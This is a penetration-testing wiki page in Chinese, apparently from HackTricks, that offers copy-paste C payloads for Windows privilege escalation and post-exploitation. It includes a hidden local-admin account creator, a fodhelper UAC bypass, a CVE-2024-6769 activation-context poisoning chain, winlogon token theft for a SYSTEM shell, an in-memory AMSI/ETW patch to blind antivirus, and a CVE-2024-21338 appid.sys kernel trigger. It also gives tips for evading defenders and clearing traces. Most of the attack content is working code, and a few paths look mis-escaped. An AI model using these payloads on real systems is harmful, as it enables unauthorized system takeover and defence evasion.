# 添加本地管理员用户

{{#include ../../banners/hacktricks-training.md}}

本页面收集了在 Windows Local Privilege Escalation 或 post-exploitation 期间非常实用的**小型、自包含 C 代码片段**。每个 payload 都设计为**便于复制粘贴**，仅需 Windows API / C runtime，并可使用 `i686-w64-mingw32-gcc`（x86）或 `x86_64-w64-mingw32-gcc`（x64）进行编译。

> ⚠️ 这些 payload 假设进程已经拥有执行相应操作所需的最低权限（例如 `SeDebugPrivilege`、`SeImpersonatePrivilege`，或用于 UAC bypass 的 medium-integrity context）。它们适用于 **red-team 或 CTF 场景**，即通过利用漏洞获得了任意 native code execution。

---

## 添加本地管理员用户
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack（中完整性 → 高完整性）
当受信任的二进制文件 **`fodhelper.exe`** 被执行时，它会查询下面的 registry path，且**不会过滤 `DelegateExecute` verb**。通过在该 key 下植入我们的 command，攻击者可以在*无需将文件写入磁盘*的情况下绕过 UAC。<sup>[[1]](#references)</sup>

*`fodhelper.exe` 查询的 registry path*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
一个弹出提升权限 `cmd.exe` 的最小 PoC：
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Tested on Windows 10 22H2 and Windows 11 23H2（2025 年 7 月补丁）。由于 Microsoft 尚未修复 `DelegateExecute` 路径中缺失的完整性检查，该 bypass 仍然有效。*

---

## UAC Bypass – Activation Context Cache Poisoning（`ctfmon.exe`、CVE-2024-6769）
由于 `ctfmon.exe` 作为高完整性受信任 UI 进程运行，会从调用者的 impersonated `C:` drive 加载内容，并复用 `CSRSS` 已缓存的 DLL 重定向，因此 Drive remapping + activation context cache poisoning 仍可针对已打补丁的 Windows 10/11 builds 生效。具体过程如下：将 `C:` 重新指向攻击者控制的存储位置，放置一个 trojanized `msctf.dll`，启动 `ctfmon.exe` 以获取 high integrity，然后要求 `CSRSS` 缓存一个 manifest，将某个 auto-elevated binary（例如 `fodhelper.exe`）使用的 DLL 重定向，使其下一次启动时无需 UAC prompt 即继承你的 payload。<sup>[[5]](#references)</sup>

Practical workflow:
1. 准备一个伪造的 `%SystemRoot%\System32` tree，并复制计划劫持的 legitimate binary（通常是 `ctfmon.exe`）。
2. 使用 `DefineDosDevice(DDD_RAW_TARGET_PATH)` 在你的进程内部重新映射 `C:`，同时保留 `DDD_NO_BROADCAST_SYSTEM`，使更改仅对本地生效。
3. 将你的 DLL 和 manifest 放入伪造的 tree，调用 `CreateActCtx/ActivateActCtx` 将 manifest 推入 activation-context cache，然后启动 auto-elevated binary，使其将重定向的 DLL 直接解析到你的 shellcode。
4. 完成后删除 cache entry（`sxstrace ClearCache`）或 reboot，以清除攻击者痕迹。

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

清理提示：在获取 SYSTEM 后，进行测试时调用 `sxstrace Trace -logfile %TEMP%\sxstrace.etl`，随后调用 `sxstrace Parse`——如果在日志中看到你的 manifest 名称，防御方也能看到，因此每次运行都应轮换路径。

---

## 通过 token duplication（`SeDebugPrivilege` + `SeImpersonatePrivilege`）启动 SYSTEM shell
如果当前进程同时持有 **`SeDebug`** 和 **`SeImpersonate`** 权限（许多 service accounts 通常具备这些权限），你可以从 `winlogon.exe` 窃取 token，复制它，然后启动 elevated process：
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
如需更深入地了解其工作原理，请参阅：

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch（Defence Evasion）
大多数现代 AV/EDR 引擎依赖 **AMSI** 和 **ETW** 来检查恶意行为。在当前进程中尽早对这两个接口进行 Patch，可以防止基于脚本的 payload（例如 PowerShell、JScript）被扫描。<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*上述 patch 仅对当前进程有效；运行后再启动新的 PowerShell 将在不进行 AMSI/ETW 检查的情况下执行。*

---

## Create child as Protected Process Light (PPL)
在创建时使用 `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL` 为子进程请求 PPL protection level。这是 documented API，只有当目标 image 已针对所请求的 signer class（Windows/WindowsLight/Antimalware/LSA/WinTcb）签名时才会成功。<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
最常使用的级别：
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

通过检查 Protection 列，使用 Process Explorer/Process Hacker 验证结果。

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` 暴露了一个设备对象（`\\.\\AppID`），其 smart-hash 维护 IOCTL 接受用户提供的函数指针，只要调用者以 `LOCAL SERVICE` 身份运行即可；Lazarus 正利用这一点禁用 PPL 并加载任意驱动，因此 red teams 应准备好一个可在 lab 中使用的现成触发器。<sup>[[6]](#references)</sup>

操作说明：
- 仍然需要一个 `LOCAL SERVICE` token。使用 `SeImpersonatePrivilege` 从 `Schedule` 或 `WdiServiceHost` 窃取该 token，然后在访问设备前进行 impersonate，以通过 ACL 检查。
- IOCTL `0x22A018` 需要一个包含两个 callback 指针的 struct（query length + read function）。将二者都指向能够构造 token overwrite 或映射 ring-0 primitives 的 user-mode stubs，但要保持 buffers 为 RWX，以免 KernelPatchGuard 在 chain 执行中途崩溃。
- 成功后退出 impersonation 并还原 device handle；defenders 目前会查找异常的 `Device\\AppID` handles，因此在获得 privilege 后立即关闭它。

<details>
<summary>C - `appid.sys` smart-hash abuse 的 Skeleton trigger</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

针对 weaponized build 的最小修复：使用 `VirtualAlloc` 映射一个 RWX section，将 token duplication stub 复制到其中，设置 `KernelThunk = section`，并且在 `DeviceIoControl` 返回后，即使处于 PPL 下，你也应当已经是 SYSTEM。

---

## 参考资料

- [1] [第一篇：欢迎及 fileless UAC bypass（fodhelper.exe / ms-settings DelegateExecute）](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – 最小化 PPL 进程启动器](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [UpdateProcThreadAttribute 函数（Win32 apps）- Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Novel Exploit Chain Enables Windows UAC Bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus 和 FudModule Rootkit：通过 Admin-to-Kernel Zero-Day 超越 BYOVD](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
